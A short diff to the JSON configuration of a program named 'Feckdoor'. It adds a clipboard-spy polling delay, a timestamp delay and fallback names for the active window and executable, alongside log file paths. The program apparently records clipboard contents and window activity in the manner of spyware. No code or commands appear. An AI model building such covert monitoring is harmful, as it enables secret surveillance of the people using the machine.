@@ -1,4 +1,8 @@
 {
 	"LogFile": "D:\\Cache\\Feckdoor.log",
-	"ErrorLogFile": "D:\\Cache\\FeckdoorError.log"
+	"ErrorLogFile": "D:\\Cache\\FeckdoorError.log",
+	"ClipboardSpyDelay": 200,
+	"TimestampDelay": 5000,
+	"FallbackWindowName": "Unknown window",
+	"FallbackWindowExecutableName": "Unknown executable"
 }
